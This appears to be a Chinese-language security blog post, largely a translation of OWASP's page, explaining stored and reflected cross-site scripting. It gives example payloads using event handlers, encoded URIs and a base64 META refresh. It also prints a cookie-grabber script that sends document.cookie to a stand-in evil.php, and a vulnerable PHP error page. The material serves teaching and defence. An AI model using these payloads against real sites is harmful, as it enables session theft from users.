---
layout: post
title: "[WEB]Cross-site_Scripting_(XSS)"
date: 2018-12-27 08:18:02 +0800
categories: [security,web]
tags: [security,web]
---

跨站點腳本（XSS）攻擊發生在：

數據通過不受信任的來源進入Web應用程序，最常見的是Web請求。<br />
數據包含在動態內容中，該動態內容在未經過惡意內容驗證的情況下發送給Web用戶。<br />
發送到Web瀏覽器的惡意內容通常採用JavaScript段的形式，但也可能包括HTML，Flash或瀏覽器可能執行的任何其他類型的程式碼。<br />
基於XSS的各種攻擊幾乎是無限的，但它們通常包括向攻擊者傳輸私有數據（如cookie或其他會話信息），將受害者重定向到攻擊者控制的Web內容，或者在用戶的計算機上執行其他惡意操作在易受攻擊的網站的幌子下。<br />


### 儲存型XSS攻擊
儲存攻擊是指注入的腳本永久儲存在目標服務器上的攻擊，例如在數據庫，消息論壇，訪問者日誌，註釋字段等中。受害者在請求儲存時從服務器檢索惡意腳本。信息。儲存的XSS有時也稱為持久性或類型I XSS。

### 反射型XSS攻擊
反射攻擊是指注入的腳本從Web服務器反射出來的攻擊，例如錯誤消息，搜索結果或包含作為請求的一部分發送到服務器的部分或全部輸入的任何其他響應。反射的攻擊通過其他途徑傳遞給受害者，例如在電子郵件中或在其他一些網站上。當用戶被欺騙點擊惡意鏈接，提交特製表單，甚至只是瀏覽惡意網站時，注入的程式碼會傳播到易受攻擊的網站，這會將攻擊反映回用戶的瀏覽器。然後瀏覽器執行程式碼，因為它來自“可信”服務器。反射的XSS有時也稱為非持久性或II型XSS。


XSS在屬性中使用腳本
可以在不使用`<script> </script>`標記的情況下進行XSS攻擊。其他標籤將完全相同，例如：
```html
<body onload=alert('test1')>
```

或其他屬性，如：onmouseover，onerror。

#### onmouseover

```html
<b onmouseover=alert('Wufff!')>click me!</b>
```

#### onerror

```html
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
```

---

### XSS使用腳本通過編碼的URI方案

如果我們需要隱藏Web應用程序過濾器，我們可能會嘗試對字符串字符進行編碼，例如： e.g.: a=&#X41 (UTF-8)並在IMG標記中使用它：

```html
<IMG SRC=j&#X41vascript:alert('test2')>
```

### XSS using code encoding
我們可以在base64中對腳本進行編碼並將其放在META標記中。 這樣我們完全擺脫了alert（）。 有關此方法的更多信息，請參閱[RFC 2397](https://tools.ietf.org/html/rfc2397)

```html
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```

---

## Examples

### Attack Examples
### Example 1: Cookie Grabber

如果應用程序未驗證輸入數據，則攻擊者可以輕鬆地從經過身份驗證的用戶竊取cookie。 攻擊者所要做的就是將以下程式碼放在任何發布的輸入中（即：留言板，私人消息，用戶配置文件）：

```javascript
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

上面的程式碼將傳遞cookie的轉義內容（根據RFC內容必須在通過HTTP協議使用GET方法發送之前將其轉義）到“cakemonster”變量中的evil.php腳本。 然後攻擊者檢查他的evil.php腳本的結果（cookie抓取器腳本通常會將cookie寫入文件）並使用它。

### 錯誤頁面示例
假設我們有一個錯誤頁面，它處理對非現有頁面的請求，這是一個經典的404錯誤頁面。 我們可以使用下面的程式碼作為示例來通知用戶缺少哪個特定頁面：

```php
<html>
<body>

<? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>
```

讓我們看看它是如何工作的：

```html
http://testsite.test/file_which_not_exist
```
作為回應我們得到：
```html
Not found: /file_which_not_exist
```
現在我們將嘗試強制錯誤頁面包含我們的程式碼：

```html
http://testsite.test/<script>alert("TEST");</script>
```
結果是：
```html
Not found: / (but with JavaScript code <script>alert("TEST");</script>)
```
我們已經成功注入了程式碼，我們的XSS！ 這是什麼意思？ 例如，我們可能會利用此漏洞試圖竊取用戶的會話cookie。

資料來源
[https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))